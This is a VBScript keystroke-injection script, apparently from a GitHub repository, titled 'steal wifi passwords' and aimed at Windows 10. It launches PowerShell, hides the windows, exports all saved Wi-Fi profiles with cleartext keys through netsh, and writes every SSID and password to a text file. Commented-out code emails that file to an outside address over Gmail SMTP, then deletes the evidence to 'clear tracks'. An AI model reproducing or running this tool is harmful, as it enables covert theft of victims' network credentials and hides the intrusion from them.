'Source:
' https://github.com/axel05869/Wifi-Grab/blob/main/wifigrab.PS1

'---------------------REFERENCE:----------------------
'https://github.com/exploitechx/wifi-password-extractor
'http://adamringenberg.com/powershell2/send-mailmessage



REM Title: steal wifi passwords 
REM Author: Hacker01 
REM Description: Steal wifi passwords from computer 
REM Target: Windows 10 
REM Version: 2.0 


Dim key_press, shell 
Dim ATTACK_T, ATTACK_R
const delay = 100 


Set shell = CreateObject("Shell.Application")
Set key_press = CreateObject("wscript.shell")

ATTACK_T = "$shell = New-Object -ComObject ""Shell.Application"""
ATTACK_R = "$shell.minimizeall"+"{(}"+"{)}"

ENTER = "{enter}"
Path = "{$}p=" + """C:\wipass"""
MKDIR = "mkdir {$}p"
ATTACK_G = "netsh wlan export profile key=clear"

ATTACK_E = "dir *.xml |{%} {{}" & ENTER & "$xml=[xml] {(}get-content $_{)}" & ENTER & "$a =" + """========================================`r`n SSID = """ + "{+}" +"$xml.WLANProfile.SSIDConfig.SSID.name{+}" + """ `r`n PASS=""" + "{+}$xml.WLANProfile.MSM.Security.sharedKey.keymaterial" & ENTER & "Out-File wifipass.txt -Append -InputObject {$}a" & ENTER &  "{}}" & ENTER 


Public sub ATTACKMODEHIDSHELL()
       wscript.sleep delay 
       shell.ShellExecute "powershell.exe"
       wscript.sleep delay
        key_press.sendkeys ATTACK_T & ENTER & ATTACK_R  & ENTER 
       wscript.sleep delay 
End Sub  

'calling out the function 
call ATTACKMODEHIDSHELL

Public sub ATTACKMODE()
       key_press.sendkeys Path & ENTER &MKDIR & ENTER & "cd {$}p" & ENTER
       wscript.sleep delay 
       key_press.sendkeys ATTACK_G & ENTER
       wscript.sleep delay
       key_press.sendkeys ATTACK_E

End Sub 
'calling out the function 
call ATTACKMODE


' You need to modify the script to send the output to an email 


' # --------Email the output file---------
' # Allow less secure apps for the sender email (https://myaccount.google.com/lesssecureapps)

'$FROM = "SENDER_EMAIL"
'$PASS = "SENDER_PASS"
'$TO = "RECEIVER_EMAIL"


'$PC_NAME = "$env:computername"
'$SUBJECT = "Wifi Password Grabber - " + $PC_NAME
'$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " are in the attached file."
'$ATTACH = "wifipass.txt"

'Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))

'# Clear tracks
'rm *.xml
'rm *.txt
'cd ..
'rm wipass

